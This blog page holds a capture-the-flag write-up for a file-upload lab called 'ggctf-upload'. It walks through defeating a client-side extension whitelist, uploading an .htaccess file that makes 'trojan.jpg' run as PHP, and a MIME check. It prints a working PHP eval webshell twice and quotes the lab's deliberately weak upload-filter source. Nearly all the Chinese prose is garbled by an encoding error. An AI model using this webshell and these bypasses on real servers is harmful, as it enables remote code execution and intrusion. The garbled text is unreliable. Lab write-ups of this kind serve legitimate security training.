<!DOCTYPE html>
<html lang="en-uk" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='File Upload: ggctf-upload „ÄäÂ≠¶‰∫Ü‰∏ÄÂ§© file-uploads‰πãÁõ¥Êé•Êç¢Âà∞ÂõΩÂÖâÂ∏àÂÇÖÁöÑÈù∂Âú∫.jpg„Äã ‰∏ªË¶ÅÊòØfile-uploads Áúã‰∏äÂéªËøòÊúâÂæàÂ§öÁöÑ openÁöÑissue'><title>File Upload: ggctf-upload</title>

<link rel='canonical' href='https://ginkgo.org.cn/posts/file_upload_ggctf_upload/'>

<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='File Upload: ggctf-upload'>
<meta property='og:description' content='File Upload: ggctf-upload „ÄäÂ≠¶‰∫Ü‰∏ÄÂ§© file-uploads‰πãÁõ¥Êé•Êç¢Âà∞ÂõΩÂÖâÂ∏àÂÇÖÁöÑÈù∂Âú∫.jpg„Äã ‰∏ªË¶ÅÊòØfile-uploads Áúã‰∏äÂéªËøòÊúâÂæàÂ§öÁöÑ openÁöÑissue'>
<meta property='og:url' content='https://ginkgo.org.cn/posts/file_upload_ggctf_upload/'>
<meta property='og:site_name' content='Under The Ginkgo'>
<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='file_upload' /><meta property='article:tag' content='security' /><meta property='article:tag' content='server_side_vul' /><meta property='article:published_time' content='2022-04-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-05-03T17:43:53&#43;01:00'/>
<meta name="twitter:title" content="File Upload: ggctf-upload">
<meta name="twitter:description" content="File Upload: ggctf-upload „ÄäÂ≠¶‰∫Ü‰∏ÄÂ§© file-uploads‰πãÁõ¥Êé•Êç¢Âà∞ÂõΩÂÖâÂ∏àÂÇÖÁöÑÈù∂Âú∫.jpg„Äã ‰∏ªË¶ÅÊòØfile-uploads Áúã‰∏äÂéªËøòÊúâÂæàÂ§öÁöÑ openÁöÑissue">
    <link rel="shortcut icon" href="/img/favicon.ico" />

<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-ZKEXSTS2N4', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/Ginkgo_hu5438825b9b6d1014226d20d231e650c2_69187_300x0_resize_q75_box.JPG" width="300"
                            height="237" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üßê</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Under The Ginkgo</a></h1>
            <h2 class="site-description">BOYS FIGHT FOR YOUR LIBERTY</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/medic0803'
                        target="_blank"
                        title="A_GitHub"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='mailto:medicwrf@gmail.com'
                        target="_blank"
                        title="B_E-mail"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1647773061437" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2742" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><defs><style type="text/css"></style></defs><path d="M937.593333 257.073333A148.353333 148.353333 0 0 0 832 213.333333H384v-42.666666h85.333333a85.333333 85.333333 0 0 0 0-170.666667H362.666667a21.333333 21.333333 0 0 0-21.333334 21.333333v192H212.26A53.426667 53.426667 0 0 0 160 170.666667h-64a53.393333 53.393333 0 0 0-53.333333 53.333333v533.333333a53.393333 53.393333 0 0 0 53.333333 53.333334h64a53.426667 53.426667 0 0 0 52.26-42.666667H384v192a21.333333 21.333333 0 0 0 21.333333 21.333333h170.666667a21.333333 21.333333 0 0 0 21.333333-21.333333v-192h362.666667a21.333333 21.333333 0 0 0 21.333333-21.333333V362.666667a148.353333 148.353333 0 0 0-43.74-105.593334zM512 85.333333a42.713333 42.713333 0 0 1-42.666667 42.666667H384V42.666667h85.333333a42.713333 42.713333 0 0 1 42.666667 42.666666zM170.666667 757.333333a10.666667 10.666667 0 0 1-10.666667 10.666667h-64a10.666667 10.666667 0 0 1-10.666667-10.666667V224a10.666667 10.666667 0 0 1 10.666667-10.666667h64a10.666667 10.666667 0 0 1 10.666667 10.666667z m384 181.333334H426.666667v-170.666667h128z m384-213.333334H213.333333V256h128v149.333333a21.333333 21.333333 0 0 0 21.333334 21.333334h85.333333a21.333333 21.333333 0 0 0 0-42.666667h-64V256h448c58.813333 0 106.666667 47.853333 106.666667 106.666667z" fill="#bababa" p-id="2743"></path></svg>
                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>
<main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/file_upload_ggctf_upload/">File Upload: ggctf-upload</a>
        </h2>
    
        
    </div>

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 27, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    13 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>
</header>

    <section class="article-content">
    
    
    <h2 id="file-upload-ggctf-upload">File Upload: ggctf-upload</h2>
<p>„ÄäÂ≠¶‰∫Ü‰∏ÄÂ§© file-uploads‰πãÁõ¥Êé•Êç¢Âà∞ÂõΩÂÖâÂ∏àÂÇÖÁöÑ<a class="link" href="https://github.com/sqlsec/upload-labs-docker"  target="_blank" rel="noopener"
    >Èù∂Âú∫</a>.jpg„Äã <!-- raw HTML omitted -->
‰∏ªË¶ÅÊòØfile-uploads Áúã‰∏äÂéªËøòÊúâÂæàÂ§öÁöÑ openÁöÑissueÔºåÊàëËá™Â∑±ÈóØÂÖ≥ÁöÑÊó∂ÂÄô‰πüÁ¢∞Âà∞‰∫ÜÂæàÂ§öÈóÆÈ¢òÔºåÂú®dockerÈáåÈù¢ÂæàÂ§öÁéØÂ¢ÉÂÜÖÂÆπÊîπËµ∑Êù•‰πü‰∏çËàíÊúçÔºåÂàöÂ•ΩÁúãÂà∞ÂõΩÂÖâÂ∏àÂÇÖÂÜôÁöÑËøô‰∏™ggctf-uploadÔºåÊúâÈÖçÂ•óÁöÑwpÂπ∂‰∏îÈïøÂæó‰πüÂ•ΩÁúãÂ∞±ÊòØ‰∫Ü <!-- raw HTML omitted --></p>
<h3 id="js">JS</h3>
<p>Á¨¨‰∏ÄÂÖ≥ÊòØ‰∏Ä‰∏™ÂâçÁ´ØÂêéÁºÄÂêçÊ£ÄÊü•ÁªïËøá <!-- raw HTML omitted --></p>
<h4 id="Ëß£Ê≥ï‰∏Ä-ÊäìÂåÖ‰øÆÊîπÁôΩÂêçÂçï">Ëß£Ê≥ï‰∏ÄÔºöÊäìÂåÖ‰øÆÊîπÁôΩÂêçÂçï</h4>
<p>Áî®BurpÊã¶Êà™‰πãÂêéÂ¢ûÂä†phpÂà∞whitelist‰∏≠Â∞±Â•Ω‰∫ÜÔºàÁôΩÂêçÂçïÂÜçÂº∫ËÉΩË¢´ÊîπÂ∞±ÊòØÁôΩÁªô233Ôºâ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-27_22-35-03_screenshot.png" width="500px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>‰∏ä‰º†ÊàêÂäüÔºåÁî®ËöÅÂâëËøûÊé•‰∏Ä‰∏ãËØïËØïÔºàËøôÈáåÂèØ‰ª•Âú®ÁΩëÈ°µÊ∫êÁ†ÅÊàñËÄÖBurpÁöÑËøîÂõûËØ∑Ê±Ç‰∏≠ÁúãÂà∞ÂõæÁâáÁöÑÈìæÊé•ÔºåÂ¶ÇÊûú‰∏¥Êó∂Êñá‰ª∂Â≠òÊîæÁöÑÂêçÂ≠óË¢´Êîπ‰∫ÜÂ∞±Áî®Âæó‰∏äÔºâ <!-- raw HTML omitted --></p>
<p>Áî®Âà∞ÁöÑ‰∏ÄÂè•ËØùÊú®È©¨ <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p><a class="link" href="https://www.edureka.co/community/66334/what-is-the-use-of-the-symbol-in-php"  target="_blank" rel="noopener"
    >PHP‰∏≠@ÁöÑ‰ΩúÁî®</a>ÔºåÊú¨Ë¥®‰∏äÂ∞±ÊòØÂèØ‰ª•ÂøΩÁï•ÊâÄÊúâÁöÑÈîôËØØ‰ø°ÊÅØ <!-- raw HTML omitted --></p>
<h4 id="Ëß£Ê≥ï‰∫å-Á¶ÅÁî®js">Ëß£Ê≥ï‰∫åÔºöÁ¶ÅÁî®JS</h4>
<p>Âà©Áî®ÊµèËßàÂô®ÁöÑÈÄâÈ°πÊàñËÄÖÊèí‰ª∂Á¶ÅÁî®JS‰πãÂêéÔºåÂÆ¢Êà∑Á´ØÁöÑËøáÊª§Â∞±Â§±Êïà‰∫Ü <!-- raw HTML omitted --></p>
<h4 id="Ëß£Ê≥ï‰∏â-js-debug">Ëß£Ê≥ï‰∏âÔºöJS debug</h4>
<p>Âú®ÂÆö‰πâÁôΩÂêçÂçïÂá∫Êâì‰∏äÊñ≠ÁÇπÔºåÁÑ∂ÂêéÂà∑Êñ∞‰∏Ä‰∏ãÔºåÊ≠•Ëøá‰πãÂêé‰øÆÊîπÁôΩÂêçÂçïÁöÑÂÜÖÂÆπÂç≥ÂèØÔºàchromeÂèØ‰ª•Áõ¥Êé•Âú®Ëæπ‰∏äÁöÑScopes‰∏≠ÊîπÔºåfirefoxÁõ¥Êé•consoleÂÆö‰πâ‰∏Ä‰∏ãÂç≥ÂèØÔºâ <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-04-27_23-14-22_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<h3 id="Ëß£Êûê‰∏ä‰º†">Ëß£Êûê‰∏ä‰º†</h3>
<p>Ëá™Êú¨ÊñáÂÆåÊàêÔºåÂõΩÂÖâÁöÑwpÂπ∂Êú™Êõ¥Êñ∞Á¨¨‰∫åÈ¢òÔºå‰ΩÜÊòØÁ±ª‰ººÁöÑÂà©Áî®ÂæàÂ§öÔºåÊú¨Êñá‰∏ªË¶ÅÊòØÂà©Áî®<a class="link" href="https://blog.csdn.net/mmzkyl/article/details/112138834"  target="_blank" rel="noopener"
    >.htaccess</a>ÁöÑÁâπÊÄßÊù•‰øÆÊîπÊúçÂä°Âô®ÂØπ‰∫éÊñá‰ª∂ÁöÑËß£ÊûêÊù•ÂÆûÁé∞ÁªïËøá <!-- raw HTML omitted --></p>
<ul>
<li>.htaccessÁöÑ‰ΩúÁî® <!-- raw HTML omitted -->
.htaccessÊñá‰ª∂ÊòØApacheÊúçÂä°Âô®‰∏ãÁöÑ‰∏Ä‰∏™ÈÖçÁΩÆÊñá‰ª∂Ôºå‰∏ªË¶ÅÁî®‰∫é <!-- raw HTML omitted -->Áõ∏ÂÖ≥ÁõÆÂΩï<!-- raw HTML omitted --> ‰∏ãÁöÑÁΩëÈ°µÈÖçÁΩÆ <!-- raw HTML omitted -->
ÂÖ∂‰ΩúÁî®Âüü‰∏∫ÂÖ∂ÊâÄÂú®ÁõÆÂΩï‰∏éÊâÄÊúâÁöÑÂ≠êÁõÆÂΩïÔºå‰ΩÜÊòØÂ¶ÇÊûúÂ≠êÁõÆÂΩï‰∏≠ÁöÑ <code>.htaccess</code> ‰ºöË¶ÜÁõñÁà∂ÁõÆÂΩïÁöÑÊïàÊûú <!-- raw HTML omitted --></li>
</ul>
<p>Âõ†Ê≠§Êàë‰ª¨ÈÄöËøá‰∏ä‰º†‰∏Ä‰∏™ <code>.htaccess</code> Êñá‰ª∂Êù•‰øÆÊîπ <code>upload</code> ÁõÆÂΩï‰∏ãÂØπ‰∫éÊñá‰ª∂ÁöÑËß£ÊûêÊù•ÂÆûÁé∞ÁªïËøá <!-- raw HTML omitted --></p>
<p>‰ª•Ê≠§‰∏ä‰º†‰∏§‰∏™Êñá‰ª∂ <!-- raw HTML omitted --></p>
<ul>
<li>
<p>.htaccess <!-- raw HTML omitted -->
Â∞Ü <code>trojan.jpg</code> Êñá‰ª∂ÂΩì‰Ωú <code>php</code> Êù•Ëß£Êûê <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!-- .htaccess --&gt;
</span></span><span class="line"><span class="cl">&lt;FilesMatch &#34;trojan.jpg&#34;&gt;
</span></span><span class="line"><span class="cl">Sethandler application/x-httpd-php
</span></span><span class="line"><span class="cl">&lt;/FilesMatch&gt;
</span></span></code></pre></div></li>
</ul>
<p>‰ª•ÂèäÂê´Êúâ‰∏ÄÂè•ËØùÊú®È©¨ÁöÑ <code>trojan.jpg</code> <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>‰πãÂêéÂ∞±ÂèØ‰ª•Áî®ËöÅÂâëÊµãËØïËøûÊé•ÊàêÂäüÔºàÊàëËøôÈáåÂèëÁé∞ÊµãËØïËøûÊé•ÊÄß‰ºöÊä•ÈîôÔºå‰ΩÜÊòØÂÆûÈôÖÊ∑ªÂä†‰∫ÜËøûÊé•ÊòØÂèØ‰ª•ËøûÊé•ÁöÑÔºâ <!-- raw HTML omitted --></p>
<p>ÊÑüËßâÂÖ∂ÂÆûË¶ÅÊòØÂÉèupload-files‰∏ÄÊ†∑ÊääÊ∫êÁ†ÅË¥¥Âá∫Êù•Â∞±Â•Ω‰∫Ü233 <!-- raw HTML omitted --></p>
<p>ÊúÄÂêéÊàë‰ª¨Êù•‰∏ÄËµ∑Áúã‰∏Ä‰∏ãphpÊ∫êÁ†ÅÔºå‰∏ªË¶ÅÊòØÂà©Áî®‰∫ÜÈªëÂêçÂçïËøáÊª§ÊâÄÊúâÁöÑwebshell <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">)[</span><span class="s1">&#39;extension&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php7&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$blacklist</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;error();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><dl>
<dt>basename()</dt>
<dd>basename(string $path, string $suffix = &ldquo;&rdquo;): string <!-- raw HTML omitted -->
path: Êñá‰ª∂Ë∑ØÂæÑ <!-- raw HTML omitted -->
suffix: Êñá‰ª∂ÂêéÁºÄ <!-- raw HTML omitted -->
return: Êñá‰ª∂ÂêçÔºàÊúâ/Êó†ÂêéÁºÄÔºâ <!-- raw HTML omitted --></dd>
<dt>pathinfo</dt>
<dd>pathinfo(string $path, int $flags = PATHINFO_ALL): array|string <!-- raw HTML omitted -->
path: Êñá‰ª∂Ë∑ØÂæÑ <!-- raw HTML omitted -->
flags: ÊåáÂÆöÈúÄË¶ÅËøîÂõûÁöÑÂÜÖÂÆπ{dirname, basename, extension, filename} <!-- raw HTML omitted -->
return: Ê†πÊçÆflagsÂÜ≥ÂÆö, Â§ö‰∏™ÂÜÖÂÆπÁöÑËØùÂ∞±‰ºöËøîÂõûÊï∞ÁªÑÔºàÈªòËÆ§ÂÖ®ÈÉ®Ôºâ <!-- raw HTML omitted --></dd>
</dl>
<h3 id="mime-ÁªïËøá">MIME ÁªïËøá</h3>
<p>È¶ñÂÖàÊàë‰ª¨Ê†πÊçÆÊèêÁ§∫‰ø°ÊÅØÊù•ËÆ§ËØÜ‰∏Ä‰∏ã <code>MIME</code> <!-- raw HTML omitted --></p>
<p>Â™í‰ΩìÁ±ªÂûãÔºàÈÄöÂ∏∏Áß∞‰∏∫ Multipurpose Internet Mail Extensions Êàñ MIME Á±ªÂûã ÔºâÊòØ‰∏ÄÁßçÊ†áÂáÜÔºåÁî®Êù•Ë°®Á§∫ÊñáÊ°£„ÄÅÊñá‰ª∂ÊàñÂ≠óËäÇÊµÅÁöÑÊÄßË¥®ÂíåÊ†ºÂºè„ÄÇ <!-- raw HTML omitted --></p>
<p>MIMEÁöÑÁªÑÊàêÁªìÊûÑÈùûÂ∏∏ÁÆÄÂçïÔºõÁî±Á±ªÂûã‰∏éÂ≠êÁ±ªÂûã‰∏§‰∏™Â≠óÁ¨¶‰∏≤‰∏≠Èó¥Áî® &lsquo;/&rsquo; ÂàÜÈöîËÄåÁªÑÊàê„ÄÇ‰∏çÂÖÅËÆ∏Á©∫Ê†ºÂ≠òÂú®„ÄÇ <!-- raw HTML omitted --></p>
<ul>
<li>type Ë°®Á§∫ÂèØ‰ª•Ë¢´ÂàÜÂ§ö‰∏™Â≠êÁ±ªÁöÑÁã¨Á´ãÁ±ªÂà´„ÄÇ <!-- raw HTML omitted --></li>
<li>subtype Ë°®Á§∫ÁªÜÂàÜÂêéÁöÑÊØè‰∏™Á±ªÂûã <!-- raw HTML omitted --></li>
</ul>
<p>ÈÄöÁî®ÁöÑÁªìÊûÑ‰∏∫Ôºö <!-- raw HTML omitted --></p>
<p>type/subtype <!-- raw HTML omitted --></p>
<p>MIMEÁ±ªÂûãÂØπÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÔºå‰ΩÜÊòØ‰º†ÁªüÂÜôÊ≥ïÈÉΩÊòØÂ∞èÂÜô„ÄÇ <!-- raw HTML omitted --></p>
<p>ÁÑ∂ÂêéÊü•ÁúãÊ∫êÁ†Å <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s2">&#34;image/jpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;image/png&#34;</span><span class="p">,</span> <span class="s2">&#34;image/gif&#34;</span><span class="p">,</span> <span class="s2">&#34;image/jpg&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;black();&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;‰∏ä‰º†Â§±Ë¥•&#39;)&lt;/script&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
